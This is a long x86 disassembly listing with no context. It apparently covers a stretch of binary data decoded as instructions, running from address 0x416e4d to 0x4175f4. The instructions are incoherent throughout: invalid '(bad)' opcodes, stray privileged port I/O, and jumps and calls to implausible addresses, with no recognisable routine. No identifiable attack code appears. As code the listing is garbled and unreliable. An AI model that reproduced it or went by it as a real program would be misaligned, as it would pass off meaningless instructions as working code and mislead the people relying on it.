  416e4d:	arpl   bp,si
  416e4f:	pop    ebx
  416e50:	lods   eax,DWORD PTR ds:[esi]
  416e51:	dec    esp
  416e52:	inc    ebp
  416e53:	movnti DWORD PTR [eax+0x52],ebp
  416e57:	test   eax,0xa4a16225
  416e5c:	dec    ecx
  416e5d:	jns    0x416e08
  416e5f:	add    eax,0x151e1620
  416e64:	sub    ch,cl
  416e66:	repnz lea edi,ds:[ecx-0x58]
  416e6b:	sub    eax,0xa9195b8d
  416e70:	sub    esi,DWORD PTR [esi]
  416e72:	fcom   st(3)
  416e74:	or     BYTE PTR [esp+ebx*4+0x414764f],ah
  416e7b:	inc    esp
  416e7c:	pushf  
  416e7d:	imul   edx,DWORD PTR [ebx],0x2f5f53f9
  416e83:	test   eax,0x4400e607
  416e88:	ja     0x416e68
  416e8a:	mov    dh,0xf6
  416e8c:	jl     0x416e85
  416e8e:	and    BYTE PTR [esi+0xde6173c],dl
  416e94:	mov    edx,0xbc868cc8
  416e99:	fdiv   DWORD PTR [edi-0x593dd6c9]
  416e9f:	xchg   esp,eax
  416ea0:	scas   eax,DWORD PTR es:[edi]
  416ea1:	ins    DWORD PTR es:[edi],dx
  416ea2:	jg     0x416e61
  416ea4:	xchg   esi,eax
  416ea5:	cmp    eax,0x90c90b4b
  416eaa:	xchg   edi,eax
  416eab:	or     BYTE PTR [eax],al
  416ead:	or     edi,DWORD PTR [eax+0x65]
  416eb0:	or     ch,dl
  416eb2:	sbb    DWORD PTR [edx+0x2f986759],eax
  416eb8:	aas    
  416eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eba:	jecxz  0x416f08
  416ebc:	stos   BYTE PTR es:[edi],al
  416ebd:	xor    ebp,esi
  416ebf:	mov    DWORD PTR ds:0x3a3a43ea,ecx
  416ec5:	out    dx,eax
  416ec6:	inc    ebp
  416ec7:	sub    al,0xcb
  416ec9:	or     DWORD PTR [edi-0x62],ecx
  416ecc:	jbe    0x416e9b
  416ece:	add    BYTE PTR [ebx-0x69b191],al
  416ed4:	arpl   dx,cx
  416ed6:	addr16 (bad) 
  416ed9:	mov    ebx,0x28e8b46d
  416ede:	pushf  
  416edf:	aad    0x4
  416ee1:	into   
  416ee2:	add    ebp,edi
  416ee4:	pop    ebp
  416ee5:	stos   BYTE PTR es:[edi],al
  416ee6:	fldcw  WORD PTR [eax+0x36]
  416ee9:	push   ebp
  416eea:	inc    edx
  416eeb:	jmp    0x416f17
  416eed:	xchg   ebx,eax
  416eee:	fcmovnbe st,st(2)
  416ef0:	lods   al,BYTE PTR ds:[esi]
  416ef1:	push   ebp
  416ef2:	cwde   
  416ef3:	mov    ds:0xcf2cef5,eax
  416ef8:	repz pop edx
  416efa:	in     eax,dx
  416efb:	ror    BYTE PTR [ebp-0x5e],0x9d
  416eff:	cmp    ch,dl
  416f01:	mov    ebx,cs
  416f03:	fcompp 
  416f05:	sub    ebx,esp
  416f07:	daa    
  416f08:	xchg   esp,eax
  416f09:	not    BYTE PTR [eax+eiz*1]
  416f0c:	outs   dx,BYTE PTR ds:[esi]
  416f0d:	out    0xc0,eax
  416f0f:	data16 add cl,BYTE PTR [ebx+edi*2]
  416f13:	loopne 0x416ec1
  416f15:	adc    DWORD PTR [eax],edx
  416f17:	xor    esp,edx
  416f19:	loopne 0x416ece
  416f1b:	cwde   
  416f1c:	mov    al,0x93
  416f1e:	das    
  416f1f:	sbb    dh,dh
  416f21:	mov    esp,0xf7157519
  416f26:	cdq    
  416f27:	sbb    DWORD PTR cs:0x73e4a476,esp
  416f2e:	add    eax,eax
  416f30:	mov    dl,0xb9
  416f32:	pop    ds
  416f33:	push   0xffffffaa
  416f35:	push   0xf7bc4669
  416f3a:	and    BYTE PTR [eax+0x5],0x73
  416f3e:	outs   dx,DWORD PTR ds:[esi]
  416f3f:	pop    ecx
  416f40:	test   al,0x8f
  416f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f43:	xor    esi,DWORD PTR [ebp+0x254c7b45]
  416f49:	out    0x98,eax
  416f4b:	mov    eax,ds:0x89e76a82
  416f50:	xchg   ebp,ebp
  416f52:	aam    0x9e
  416f54:	sbb    al,ah
  416f56:	and    esp,DWORD PTR ds:0x6d7be967
  416f5c:	sbb    dh,BYTE PTR [edx-0x68e8a4f6]
  416f62:	test   al,0x5c
  416f64:	das    
  416f65:	mul    DWORD PTR [edx]
  416f67:	lea    eax,[edi+esi*8-0x3153c2d3]
  416f6e:	pop    edx
  416f6f:	mov    esi,0x4ad80db8
  416f74:	pop    es
  416f75:	ficomp DWORD PTR [esi]
  416f77:	js     0x416fa7
  416f79:	mov    ds:0xcdb3cf8b,eax
  416f7e:	push   esi
  416f7f:	cld    
  416f80:	nop
  416f81:	das    
  416f82:	in     eax,0x3b
  416f84:	xchg   DWORD PTR [edi],eax
  416f86:	loopne 0x416f08
  416f88:	mov    eax,0x92218e6f
  416f8d:	add    BYTE PTR [ecx+eax*4],0x8
  416f91:	ret    0x34d1
  416f94:	jg     0x416f2b
  416f96:	mov    bh,0xf4
  416f98:	lods   eax,DWORD PTR ds:[esi]
  416f99:	pop    ss
  416f9a:	cs fsub st,st(2)
  416f9d:	clc    
  416f9e:	mov    eax,0x83ce69aa
  416fa3:	add    DWORD PTR [esi+0x35cda57b],esp
  416fa9:	aad    0xb0
  416fab:	or     esp,ebp
  416fad:	pop    ebx
  416fae:	test   DWORD PTR [ebp-0x63],esi
  416fb1:	push   esp
  416fb2:	jmp    0x165f2d6a
  416fb7:	dec    ebx
  416fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fb9:	xchg   esp,eax
  416fba:	ins    BYTE PTR es:[edi],dx
  416fbb:	pop    edi
  416fbc:	and    al,0x26
  416fbe:	pushf  
  416fbf:	mov    dh,0x24
  416fc1:	cmp    esi,DWORD PTR [edx-0x2fb616ba]
  416fc7:	and    BYTE PTR [eax+0x79],0x8f
  416fcb:	inc    ecx
  416fcc:	fs mov ch,0xca
  416fcf:	inc    ebp
  416fd0:	pop    edx
  416fd1:	lods   al,BYTE PTR ds:[esi]
  416fd2:	addr16 and eax,0x84d3bca
  416fd8:	or     DWORD PTR [eax],ebp
  416fda:	loopne 0x41702c
  416fdc:	pop    ebp
  416fdd:	lods   eax,DWORD PTR ds:[esi]
  416fde:	mov    ch,0x54
  416fe0:	mov    eax,0xcb06594d
  416fe5:	mov    dl,0x8
  416fe7:	mov    esi,0x88ff6c76
  416fec:	jo     0x416ff3
  416fee:	and    BYTE PTR [ecx],al
  416ff0:	fmul   QWORD PTR [edi]
  416ff2:	jb     0x41700b
  416ff4:	sti    
  416ff5:	faddp  st(3),st
  416ff7:	stos   BYTE PTR es:[edi],al
  416ff8:	jle    0x417020
  416ffa:	mov    cs,WORD PTR [esi+0x57]
  416ffd:	fdiv   DWORD PTR [eax+0x34]
  417000:	xor    dl,BYTE PTR [ebx+ecx*8]
  417003:	inc    eax
  417004:	mov    ds:0xb1a209cd,eax
  417009:	gs push ebp
  41700b:	inc    edi
  41700c:	fcom   QWORD PTR [eax]
  41700e:	sub    BYTE PTR [esi+0x7c],al
  417011:	jnp    0x41706c
  417013:	and    eax,0xb6961504
  417018:	dec    esp
  417019:	xchg   edx,eax
  41701a:	jmp    0x392d20a3
  41701f:	xchg   esp,eax
  417020:	adc    eax,0x1f216414
  417025:	pop    esp
  417026:	and    al,0xc3
  417028:	retf   
  417029:	in     eax,0x8c
  41702b:	mov    al,ds:0x513fae60
  417030:	inc    esp
  417031:	dec    ecx
  417032:	xchg   esi,eax
  417033:	push   esi
  417034:	inc    esp
  417035:	pop    esi
  417036:	imul   eax,DWORD PTR [esp+edx*8],0x7ee323b4
  41703d:	aad    0xe5
  41703f:	adc    DWORD PTR [ebp+0x6a35e9d6],esp
  417045:	adc    DWORD PTR [eax+edi*8-0x3c],ebx
  417049:	das    
  41704a:	(bad)  
  41704b:	push   ecx
  41704c:	cmp    BYTE PTR [edi+esi*2-0x2a5c1419],ah
  417053:	inc    eax
  417054:	cld    
  417055:	jle    0x4170a2
  417057:	and    DWORD PTR [eax],edi
  417059:	or     BYTE PTR [ebx+0x6e],ch
  41705c:	push   esp
  41705d:	inc    edx
  41705e:	aas    
  41705f:	mov    edi,0xcaa81790
  417064:	(bad)  
  417065:	int    0x4
  417067:	(bad)  
  417068:	not    BYTE PTR [ebp+0x431e4c48]
  41706e:	loopne 0x417091
  417070:	out    0x3f,eax
  417072:	push   edi
  417073:	scas   al,BYTE PTR es:[edi]
  417074:	or     bl,BYTE PTR [edi]
  417076:	adc    BYTE PTR [esi-0x16],dl
  417079:	aaa    
  41707a:	cs mov edx,?
  41707d:	pop    esi
  41707e:	dec    esi
  41707f:	loope  0x4170ab
  417081:	mov    esi,0xf406cfe4
  417086:	jb     0x41701a
  417088:	cld    
  417089:	pop    ds
  41708a:	adc    eax,0xa134e14b
  41708f:	jns    0x417056
  417091:	mov    eax,0xc594611c
  417096:	push   DWORD PTR [ebp-0x71]
  417099:	dec    edi
  41709a:	leave  
  41709b:	retf   
  41709c:	add    BYTE PTR [eax+0x6bd6ad1c],bh
  4170a2:	adc    BYTE PTR [ebx-0x7fa37f7f],bl
  4170a8:	or     al,0x4e
  4170aa:	dec    esp
  4170ab:	mov    al,0x5f
  4170ad:	pop    ss
  4170ae:	jl     0x41710f
  4170b0:	pop    esi
  4170b1:	and    al,BYTE PTR [ecx-0x2cf46d7]
  4170b7:	cmp    al,0xb6
  4170b9:	cmp    edi,DWORD PTR [ebp+0x3ddf60c0]
  4170bf:	shr    BYTE PTR [esi-0x5],1
  4170c2:	jb     0x4170eb
  4170c4:	test   BYTE PTR [ebp+eiz*1+0x7c],cl
  4170c8:	and    DWORD PTR [ecx],ecx
  4170ca:	cmp    eax,0x2f44ec00
  4170cf:	push   esp
  4170d0:	neg    dh
  4170d2:	mov    al,0x5d
  4170d4:	lock in eax,dx
  4170d6:	iret   
  4170d7:	ds sbb esi,edi
  4170da:	arpl   WORD PTR [edi-0x6b],dx
  4170dd:	popa   
  4170de:	retf   0x3998
  4170e1:	out    dx,eax
  4170e2:	push   edi
  4170e3:	fdiv   DWORD PTR [edx+0x1e8fca5b]
  4170e9:	sub    al,0xb8
  4170eb:	mov    al,ds:0x8e2ab32d
  4170f0:	pusha  
  4170f1:	ss cli 
  4170f3:	cmp    al,0x80
  4170f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170f6:	(bad)  
  4170f7:	inc    edx
  4170f8:	or     al,0xbb
  4170fa:	stc    
  4170fb:	jns    0x417095
  4170fd:	mov    al,ds:0x6847785
  417102:	loop   0x41712c
  417104:	sbb    al,0x91
  417106:	or     ah,0xdf
  417109:	lea    ebx,[esi]
  41710b:	jmp    0x98c5c1ee
  417110:	lahf   
  417111:	cmp    BYTE PTR [ecx-0x74],ch
  417114:	rcl    bh,1
  417116:	xor    esp,edx
  417118:	pop    es
  417119:	imul   ebx,DWORD PTR [bx+si],0x39fdcbc
  417120:	mov    edi,0x67b3b747
  417125:	mov    edi,0xef4506a0
  41712a:	ficomp DWORD PTR [esi+ecx*4+0x35]
  41712e:	or     eax,0xc56094e7
  417133:	call   0x83703f62
  417138:	push   0x28
  41713a:	pop    ecx
  41713b:	xor    eax,esp
  41713d:	call   0xddab4f6
  417142:	cwde   
  417143:	popf   
  417144:	in     al,0x3c
  417146:	into   
  417147:	cwde   
  417148:	fidiv  DWORD PTR [ebx+eiz*8+0x24]
  41714c:	xchg   edi,eax
  41714d:	sbb    al,0x2
  41714f:	jno    0x41713f
  417151:	rol    esi,cl
  417153:	push   DWORD PTR [esi]
  417155:	cmp    BYTE PTR [esi],ah
  417157:	call   0x7e30a2b6
  41715c:	jae    0x41712c
  41715e:	jns    0x41716f
  417160:	lods   al,BYTE PTR ds:[esi]
  417161:	rcpps  xmm3,XMMWORD PTR [eax+0x50]
  417165:	cdq    
  417166:	pushf  
  417167:	in     al,0x59
  417169:	mov    bh,0x52
  41716b:	lahf   
  41716c:	mov    edx,0xcc34181a
  417171:	test   al,0x7
  417173:	push   edi
  417174:	mov    esp,0x19055c08
  417179:	mov    dh,0x2c
  41717b:	xchg   edx,eax
  41717c:	adc    bh,BYTE PTR [edi-0x77eea76]
  417182:	das    
  417183:	adc    dh,BYTE PTR [ecx+ecx*4-0x31]
  417187:	fldenv [ecx]
  417189:	jle    0x4171c6
  41718b:	and    dh,BYTE PTR [edi-0xa8caa0a]
  417191:	test   BYTE PTR [esi+0x2063700b],bh
  417197:	push   edx
  417198:	adc    al,0x60
  41719a:	dec    ebx
  41719b:	ret    
  41719c:	sahf   
  41719d:	fistp  QWORD PTR [esi-0x171cf89c]
  4171a3:	xchg   ecx,eax
  4171a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171a5:	xlat   BYTE PTR ds:[ebx]
  4171a6:	xchg   edi,eax
  4171a7:	mov    al,0x1b
  4171a9:	mov    dh,0xd4
  4171ab:	fimul  DWORD PTR [esp+edx*1]
  4171ae:	push   es
  4171af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171b1:	shl    DWORD PTR [eax+0x29fa2673],cl
  4171b7:	inc    edi
  4171b8:	inc    esp
  4171b9:	jo     0x4171f0
  4171bb:	add    BYTE PTR [eax],bh
  4171bd:	(bad)  
  4171be:	push   eax
  4171bf:	loop   0x4171f0
  4171c1:	xor    eax,0xe73f2b8b
  4171c6:	sbb    eax,0xf4a525c6
  4171cb:	scas   al,BYTE PTR es:[edi]
  4171cc:	in     al,0x2e
  4171ce:	dec    eax
  4171cf:	nop
  4171d0:	or     bl,BYTE PTR [edi+edx*2+0x3c]
  4171d4:	ja     0x417209
  4171d6:	dec    ebp
  4171d7:	outs   dx,BYTE PTR ds:[esi]
  4171d8:	push   es
  4171d9:	dec    edx
  4171da:	int    0x12
  4171dc:	in     al,dx
  4171dd:	retf   
  4171de:	inc    esp
  4171df:	mov    eax,ds:0x9e60c41b
  4171e4:	cmp    al,0xc
  4171e6:	imul   ebx,DWORD PTR [ebx],0x4
  4171e9:	sbb    DWORD PTR [esi],esp
  4171eb:	enter  0x5b3f,0xff
  4171ef:	lods   al,BYTE PTR ds:[esi]
  4171f0:	mov    dl,0xeb
  4171f2:	mov    al,0x51
  4171f4:	inc    esp
  4171f5:	jp     0x417219
  4171f7:	shl    DWORD PTR [esi],cl
  4171f9:	ins    BYTE PTR es:[edi],dx
  4171fa:	mov    BYTE PTR [ebx],cl
  4171fc:	xlat   BYTE PTR ds:[ebx]
  4171fd:	push   0x82a622a9
  417202:	mov    BYTE PTR [esp+esi*1-0x48],dh
  417206:	mov    ebp,DWORD PTR [esi-0x7df93001]
  41720c:	sbb    DWORD PTR [eax],esp
  41720e:	sbb    BYTE PTR [eax+0x31],ah
  417211:	aad    0xb4
  417213:	push   ecx
  417214:	outs   dx,BYTE PTR ds:[esi]
  417215:	jp     0x4171a7
  417217:	pop    esp
  417218:	jne    0x417299
  41721a:	mov    dl,0x37
  41721c:	movzx  eax,WORD PTR [ebx]
  41721f:	iret   
  417220:	fcomp  QWORD PTR [esp+esi*2+0x538a3b95]
  417227:	xchg   ebx,eax
  417228:	and    eax,0xc1ed2c68
  41722d:	call   0xf4ec:0x40be6787
  417234:	stos   BYTE PTR es:[edi],al
  417235:	icebp  
  417236:	dec    ebx
  417237:	jg     0x417275
  417239:	inc    BYTE PTR [ecx+0x69]
  41723c:	sbb    DWORD PTR [ebx-0xd33d340],eax
  417242:	stos   DWORD PTR es:[edi],eax
  417243:	xor    eax,0x5ce9060
  417248:	dec    DWORD PTR [edi+0x67d2be15]
  41724e:	repnz adc DWORD PTR [esp+ecx*2-0x13],edx
  417253:	xchg   ecx,eax
  417254:	jle    0x41728f
  417256:	mov    gs,WORD PTR [edx]
  417258:	xchg   ebp,eax
  417259:	leave  
  41725a:	xor    BYTE PTR ds:0x32cfb3f6,dl
  417260:	pop    ebx
  417261:	xchg   ch,bh
  417263:	push   ebx
  417264:	inc    ebx
  417265:	jns    0x4172a9
  417267:	mov    edx,DWORD PTR [esi]
  417269:	test   DWORD PTR ds:0xdbbf081f,ebp
  41726f:	pop    esi
  417270:	pop    ss
  417271:	data16 hlt 
  417273:	ret    0x4190
  417276:	push   edi
  417277:	idiv   DWORD PTR [eax]
  417279:	pop    esi
  41727a:	sub    ch,BYTE PTR [edx-0x345fe54e]
  417280:	inc    esi
  417281:	popa   
  417282:	jbe    0x4172a0
  417284:	adc    edx,ebx
  417286:	loop   0x417245
  417288:	adc    dl,ch
  41728a:	in     al,0xc9
  41728c:	mov    eax,0x2b729ad5
  417291:	jbe    0x417286
  417293:	icebp  
  417294:	push   edx
  417295:	or     al,bl
  417297:	inc    ebx
  417298:	mov    dh,0xb5
  41729a:	in     eax,dx
  41729b:	out    dx,eax
  41729c:	jle    0x4172f9
  41729e:	mov    al,0x6d
  4172a0:	lahf   
  4172a1:	adc    al,BYTE PTR [eax+0x5737503]
  4172a7:	mov    bl,0x5a
  4172a9:	push   eax
  4172aa:	mov    ds:0xd59bffa8,al
  4172af:	push   0xdbf48c13
  4172b4:	jmp    0x3847:0xd8d85e79
  4172bb:	jnp    0x417266
  4172bd:	cdq    
  4172be:	xor    eax,0x3f121a2d
  4172c3:	cmp    DWORD PTR [esi+0x25c192fb],esi
  4172c9:	mov    esi,DWORD PTR [esi+ebx*8-0x59]
  4172cd:	xor    al,0xac
  4172cf:	scas   eax,DWORD PTR es:[edi]
  4172d0:	iret   
  4172d1:	pop    ebp
  4172d2:	add    ah,BYTE PTR [ebp+0x14]
  4172d5:	add    eax,DWORD PTR [ecx]
  4172d7:	sbb    bh,BYTE PTR [edi+0x2ff72c5c]
  4172dd:	dec    esp
  4172de:	dec    edi
  4172df:	lds    ebx,FWORD PTR [edx-0xac661d5]
  4172e5:	inc    esp
  4172e6:	or     DWORD PTR [ebx],esi
  4172e8:	push   ss
  4172e9:	mov    BYTE PTR [eax-0xec0226b],dl
  4172ef:	and    al,0xa9
  4172f1:	ret    
  4172f2:	and    cl,BYTE PTR [edx]
  4172f4:	jne    0x417333
  4172f6:	imul   edx,DWORD PTR [ebp-0x3b396194],0x57
  4172fd:	or     bh,dl
  4172ff:	hlt    
  417300:	push   0x5d
  417302:	cwde   
  417303:	js     0x41732b
  417305:	mov    ecx,esp
  417307:	mov    al,ds:0x904726df
  41730c:	and    BYTE PTR ds:0x5d60e3db,0xc3
  417313:	adc    ch,al
  417315:	dec    esp
  417316:	mov    ds:0xf9112136,al
  41731b:	pop    eax
  41731c:	icebp  
  41731d:	mov    eax,0x2d795c5b
  417322:	lods   eax,DWORD PTR ds:[esi]
  417323:	iret   
  417324:	mov    ds:0x840dff8d,eax
  417329:	fidiv  DWORD PTR [esi]
  41732b:	retf   
  41732c:	ins    BYTE PTR es:[edi],dx
  41732d:	inc    ebx
  41732e:	pop    esi
  41732f:	mov    ebx,0x8e691a0b
  417334:	stos   BYTE PTR es:[edi],al
  417335:	fiadd  WORD PTR [edi+ecx*2-0x6b]
  417339:	sub    eax,0xbcf412d7
  41733e:	push   esp
  41733f:	push   edx
  417340:	jae    0x41738e
  417342:	pop    ss
  417343:	cs pop ecx
  417345:	lock enter 0x98d4,0x92
  41734a:	mov    bl,0x1e
  41734c:	and    al,0x4b
  41734e:	lahf   
  41734f:	push   eax
  417350:	dec    edi
  417351:	ss hlt 
  417353:	or     ah,dh
  417355:	push   edi
  417356:	sti    
  417357:	adc    edx,DWORD PTR [edi+0x53296f6d]
  41735d:	jecxz  0x417395
  41735f:	addr16 jl 0x417327
  417362:	inc    esp
  417363:	add    DWORD PTR [ecx-0xe],ebp
  417366:	in     eax,dx
  417367:	push   0x28340f1a
  41736c:	inc    edi
  41736d:	xor    BYTE PTR [edx],dh
  41736f:	stc    
  417370:	mov    al,ds:0x19419e77
  417375:	dec    DWORD PTR [ecx-0x41]
  417378:	cwde   
  417379:	sub    eax,0xb55b1ae0
  41737e:	(bad)  
  41737f:	cs ja  0x4173ed
  417382:	div    DWORD PTR [ebp+eax*8+0x3b]
  417386:	lds    edi,FWORD PTR [edi-0x3c]
  417389:	xor    al,0x31
  41738b:	addr16 push ebx
  41738d:	pop    eax
  41738e:	xchg   edi,eax
  41738f:	popf   
  417390:	jb     0x417375
  417392:	pop    edi
  417393:	add    edx,DWORD PTR [edi+0x48]
  417396:	sub    BYTE PTR [ebx],ah
  417398:	xchg   edx,eax
  417399:	push   ds
  41739a:	dec    esp
  41739b:	into   
  41739c:	sar    ah,0x68
  41739f:	fadd   QWORD PTR [edx+0x64a4d7f6]
  4173a5:	fnstsw WORD PTR [edi-0x7a49fe9a]
  4173ab:	scas   eax,DWORD PTR es:[edi]
  4173ac:	push   esp
  4173ad:	lds    edi,FWORD PTR [ebp+0x1d10bf24]
  4173b3:	inc    ecx
  4173b4:	pop    eax
  4173b5:	fwait
  4173b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173b7:	pop    ebp
  4173b8:	in     eax,dx
  4173b9:	test   al,0x5d
  4173bb:	fiadd  DWORD PTR [esp+ecx*2+0x76]
  4173bf:	repnz ins BYTE PTR es:[edi],dx
  4173c1:	cmc    
  4173c2:	enter  0xc320,0x8c
  4173c6:	jae    0x417369
  4173c8:	sbb    eax,DWORD PTR [ebp+0x4b8d154a]
  4173ce:	mov    DWORD PTR [esi+eax*2],ebp
  4173d1:	pop    ds
  4173d2:	(bad)  [edi+0x8]
  4173d5:	std    
  4173d6:	into   
  4173d7:	(bad)  
  4173d8:	arpl   di,di
  4173da:	(bad)  
  4173db:	fisubr WORD PTR [eax+ebx*1-0xba4b437]
  4173e2:	pop    ds
  4173e3:	in     al,dx
  4173e4:	dec    ecx
  4173e5:	jecxz  0x4173b3
  4173e7:	stc    
  4173e8:	sar    BYTE PTR [esi],0x7e
  4173eb:	xsaveopt [esi]
  4173ee:	pop    eax
  4173ef:	(bad)  
  4173f0:	aam    0x31
  4173f2:	or     ebp,DWORD PTR [edi-0x5c650b3]
  4173f8:	mov    ch,0x6f
  4173fa:	cmovg  ebp,DWORD PTR [ebp-0xf]
  4173fe:	mov    ebx,0x2380b844
  417403:	lock ss adc eax,0x61b36ed4
  41740a:	add    ecx,0xffffff99
  41740d:	je     0x4173a0
  41740f:	mov    eax,edx
  417411:	cdq    
  417412:	or     ah,bh
  417414:	sbb    dl,BYTE PTR [ebx+0x4d15cc7e]
  41741a:	ds pop edx
  41741c:	and    eax,0xa76a6785
  417421:	jbe    0x4173f8
  417423:	in     eax,dx
  417424:	mov    ebx,0xcaa43334
  417429:	shl    DWORD PTR [ecx-0x5c11efd0],1
  41742f:	leave  
  417430:	popf   
  417431:	hlt    
  417432:	repnz pop edx
  417434:	sub    DWORD PTR [edi+0x19],ebp
  417437:	sbb    esi,DWORD PTR [ebp-0x22]
  41743a:	sub    al,0x3d
  41743c:	dec    eax
  41743d:	pavgw  mm7,QWORD PTR [edi-0x5a]
  417441:	mov    BYTE PTR [ebx],ah
  417443:	call   0x7ea98057
  417448:	dec    edi
  417449:	inc    eax
  41744a:	call   0x434f:0xd550cee
  417451:	lds    ebx,FWORD PTR [esi]
  417453:	ficomp DWORD PTR [edi]
  417455:	gs test eax,0x201a69ce
  41745b:	daa    
  41745c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41745d:	push   edx
  41745e:	out    0x33,eax
  417460:	(bad)  
  417461:	jb     0x41742d
  417463:	repnz or al,0x5a
  417466:	cmp    al,ah
  417468:	sub    BYTE PTR [eax-0x3f377e24],dl
  41746e:	and    DWORD PTR [edi+0x3cc6c48f],eax
  417474:	sar    edi,0xdb
  417477:	lahf   
  417478:	mov    al,BYTE PTR [edi-0x26]
  41747b:	test   eax,0x56ca55f9
  417480:	aam    0xfa
  417482:	dec    esi
  417483:	data16 aad 0x9d
  417486:	mov    al,0x7d
  417488:	jmp    0x417441
  41748a:	mov    eax,ds:0x9c2a11e9
  41748f:	fidivr WORD PTR [edi+0x200363e3]
  417495:	mov    ebx,0xc17be38d
  41749a:	mov    ch,0x54
  41749c:	ins    BYTE PTR es:[edi],dx
  41749d:	cmp    DWORD PTR [edx+ebx*1+0x7f],0xffffffc4
  4174a2:	push   es
  4174a3:	jge    0x41746a
  4174a5:	loop   0x417477
  4174a7:	and    al,BYTE PTR [edi]
  4174a9:	xchg   ecx,eax
  4174aa:	arpl   WORD PTR [eax],di
  4174ac:	xchg   esi,eax
  4174ad:	jp     0x4174b2
  4174af:	mov    esp,0xdc5d56be
  4174b4:	mov    ch,0x25
  4174b6:	xor    BYTE PTR [ebx-0x45d813f],bl
  4174bc:	jg     0x41751f
  4174be:	and    esi,DWORD PTR [ebp-0x42ce0416]
  4174c4:	out    0x32,eax
  4174c6:	fiadd  DWORD PTR [edx]
  4174c8:	push   es
  4174c9:	mov    cl,0xeb
  4174cb:	xchg   edx,eax
  4174cc:	push   ebx
  4174cd:	cld    
  4174ce:	dec    ebx
  4174cf:	push   esi
  4174d0:	add    al,0x91
  4174d2:	sbb    DWORD PTR ss:[ebx],edx
  4174d5:	out    dx,eax
  4174d6:	fisub  WORD PTR [ecx-0x2b]
  4174d9:	pop    es
  4174da:	(bad)  
  4174db:	or     al,0xb8
  4174dd:	pushf  
  4174de:	cmp    esp,eax
  4174e0:	sub    DWORD PTR [edx-0x62],0xa25f73fb
  4174e7:	cli    
  4174e8:	or     BYTE PTR [ebp+0x21],cl
  4174eb:	loop   0x4174dd
  4174ed:	addr16 icebp 
  4174ef:	stos   DWORD PTR es:[edi],eax
  4174f0:	(bad)  
  4174f2:	fimul  DWORD PTR [ecx]
  4174f4:	sub    al,0x90
  4174f6:	inc    ecx
  4174f7:	fild   DWORD PTR [edi+ebp*4]
  4174fa:	sub    al,0xe7
  4174fc:	sbb    bl,BYTE PTR [ebp+0x67]
  4174ff:	popf   
  417500:	xor    edi,DWORD PTR [ebx+0x35f38b1e]
  417506:	scas   eax,DWORD PTR es:[edi]
  417507:	popf   
  417508:	js     0x417555
  41750a:	scas   eax,DWORD PTR es:[edi]
  41750b:	xchg   edx,eax
  41750c:	cld    
  41750d:	mov    ds:0x63e4f3a4,al
  417512:	inc    ecx
  417513:	das    
  417514:	out    0xf9,al
  417516:	stos   DWORD PTR es:[edi],eax
  417517:	clc    
  417518:	lahf   
  417519:	mov    BYTE PTR [esi+0x1c],dh
  41751c:	pop    eax
  41751d:	or     BYTE PTR [ecx+eiz*8-0x9cb10c9],ch
  417524:	out    dx,al
  417525:	nop
  417526:	jo     0x4174e7
  417528:	fdiv   QWORD PTR [eax]
  41752a:	retf   
  41752b:	fnstsw WORD PTR [esi+ecx*2-0x20]
  41752f:	push   ebp
  417530:	fldcw  WORD PTR [edi+0x41]
  417533:	or     bh,BYTE PTR [edi]
  417535:	xor    eax,0x47da7c76
  41753a:	and    esp,DWORD PTR es:0xb16e
  417540:	dec    ebx
  417541:	popa   
  417542:	aaa    
  417543:	xchg   esp,eax
  417544:	outs   dx,DWORD PTR ds:[esi]
  417545:	sbb    dh,bh
  417547:	cmp    eax,0xe5469d62
  41754c:	fist   WORD PTR [ecx]
  41754e:	xchg   bl,bh
  417550:	xchg   esi,eax
  417551:	fcmove st,st(2)
  417553:	test   al,0xdd
  417555:	js     0x417530
  417557:	inc    ebx
  417558:	jne    0x417503
  41755a:	repnz test BYTE PTR [eax+0xf],0x5b
  41755f:	repnz xor al,0x0
  417562:	sub    ah,BYTE PTR [ecx-0x63cebae6]
  417568:	and    bh,ch
  41756a:	pusha  
  41756b:	imul   ebx,esi,0x3f9e41c
  417571:	nop
  417572:	fs push ss
  417574:	pop    eax
  417575:	jae    0x417597
  417577:	cmp    esi,DWORD PTR ss:0xbeb0321f
  41757e:	in     al,0xdc
  417580:	jns    0x41753e
  417582:	rcr    ebx,cl
  417584:	jae    0x417537
  417586:	imul   ebx,DWORD PTR [esi+eax*4+0x27],0xffffffcd
  41758b:	in     eax,0xaf
  41758d:	nop
  41758e:	mov    ecx,0x62854019
  417593:	sahf   
  417594:	aas    
  417595:	and    DWORD PTR [edi+0x52],0x2b7a9c5e
  41759c:	popf   
  41759d:	jbe    0x4175e0
  41759f:	ss sbb eax,0x420c0d94
  4175a5:	fldcw  WORD PTR [ecx-0x200babbb]
  4175ab:	lods   eax,DWORD PTR ds:[esi]
  4175ac:	xor    eax,0xb14618b9
  4175b1:	push   cs
  4175b2:	cmp    eax,esp
  4175b4:	ret    0xe9e6
  4175b7:	add    ch,BYTE PTR [edi]
  4175b9:	ins    DWORD PTR es:[edi],dx
  4175ba:	scas   al,BYTE PTR es:[edi]
  4175bb:	pusha  
  4175bc:	jge    0x417560
  4175be:	cmp    al,bh
  4175c0:	sahf   
  4175c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175c2:	lock mov edx,DWORD PTR [esi]
  4175c5:	and    esi,DWORD PTR [ebx-0xc]
  4175c8:	pop    esi
  4175c9:	out    0x2f,al
  4175cb:	mov    esp,0xc66e14e6
  4175d0:	xchg   BYTE PTR [ebx-0x51],cl
  4175d3:	or     BYTE PTR gs:[edx-0x7e],al
  4175d7:	dec    eax
  4175d8:	test   ebp,ebp
  4175da:	dec    edx
  4175db:	sbb    ebx,edx
  4175dd:	rol    DWORD PTR [eax+0x2afc5260],1
  4175e3:	fwait
  4175e4:	inc    eax
  4175e5:	pop    ds
  4175e6:	addr16 mov esp,0x9edd5dca
  4175ec:	out    0x84,al
  4175ee:	(bad)  
  4175ef:	out    dx,al
  4175f0:	outs   dx,BYTE PTR ds:[esi]
  4175f1:	push   es
  4175f2:	inc    ebp
  4175f3:	pop    ebp
  4175f4:	mov    al,ds:0x6881f757
